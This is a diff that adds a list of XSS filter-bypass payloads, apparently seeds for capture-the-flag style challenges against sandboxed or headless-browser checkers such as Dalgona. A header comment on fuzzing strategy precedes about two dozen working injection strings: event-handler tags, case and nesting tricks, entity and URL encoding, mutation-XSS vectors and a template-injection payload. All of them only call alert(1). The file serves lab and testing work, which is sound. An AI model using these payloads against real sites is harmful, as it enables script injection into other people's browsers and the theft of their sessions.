@@ -1,0 +1,29 @@
+# Sandboxed / headless-browser XSS bypass seeds (Dalgona, js2py, DOM checkers).
+# Try cheapest reflection first. CRITICAL RULE: if a literal like "1" / "true"
+# returns the SAME error as every payload below, the CHECKER is crashing before
+# it reads your payload — STOP fuzzing tags here and pull the variant's checker
+# source (do9duck/dalgona) instead. No tag variant fixes a crashing checker.
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<marquee onstart=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<jAvAsCrIpT:alert(1)>
+<svg/onload=alert(1)>
+<img src=x onerror=&#97;lert(1)>
+<template><svg onload=alert(1)>
+<form><button formaction=javascript:alert(1)>X
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+%3Csvg%20onload%3Dalert(1)%3E
+<img src=x onerror=alert(`1`)>
+<svg onload=window['al'+'ert'](1)>
+"/><svg onload=alert(1)>
+javascript:alert(1)//
+{{constructor.constructor('alert(1)')()}}
